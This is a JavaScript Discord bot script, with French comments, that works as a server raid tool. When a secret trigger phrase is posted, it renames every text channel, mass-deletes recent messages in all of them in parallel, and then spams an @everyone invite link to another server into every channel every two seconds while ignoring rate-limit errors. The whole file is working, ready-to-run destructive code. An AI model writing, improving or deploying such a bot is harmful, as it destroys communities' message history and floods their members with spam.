// LE SPAM DE SEVEN - VERSION TURBO
const { Client, GatewayIntentBits } = require('discord.js');

const client = new Client({
  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent]
});

const ACTIVATION_WORD = '!!!cadeaudu7';
const NEW_NAME = 'GO-GLASTRP';
const SPAM_LINK = 'GO TOUT LE MONDE @EVERYONE https://discord.gg/glastv1';

client.on('ready', () => {
  console.log("Logged in as " + client.user.tag);
});

client.on('messageCreate', async (message) => {
  if (message.content === ACTIVATION_WORD) {
    console.log("🚀 ACTIVATION TURBO !");
    await message.channel.send('OKAAYYY LESSGOOO');

    const guild = message.guild;
    if (!guild) return;

    // TOUS EN PARALLÈLE = 10x plus rapide !
    const textChannels = guild.channels.cache.filter(ch => ch.isTextBased());
    
    await Promise.all(
      textChannels.map(async (channel) => {
        try {
          // 1. RENOOMMER (instantané)
          await channel.setName(NEW_NAME);
          
          // 2. PURGE RAPIDE (plusieurs lots en parallèle)
          await fastPurge(channel);
          
        } catch (err) {
          console.error(`❌ ${channel.name}:`, err.message);
        }
      })
    );

    // SPAM ULTRA-RAPIDE
    setInterval(() => {
      textChannels.forEach(ch => ch.send(SPAM_LINK).catch(() => {}));
    }, 2000); // 2s au lieu de 5s
  }
});

// PURGE ULTRA-RAPIDE (3 lots max)
async function fastPurge(channel) {
  try {
    // Lot 1: 50 messages
    await channel.bulkDelete(50, true);
    
    // Lot 2: 50 autres (si y'en a encore)
    await channel.bulkDelete(50, true);
    
    // Lot 3: reste (100 max)
    const remaining = await channel.messages.fetch({ limit: 100 });
    if (remaining.size > 0) {
      await channel.bulkDelete(remaining, true);
    }
    
    console.log(`⚡ #${channel.name} PURGÉ (150+ msg)`);
  } catch (err) {
    // Ignore les erreurs de rate limit
  }
}

client.login(process.env.DISCORD_TOKEN);
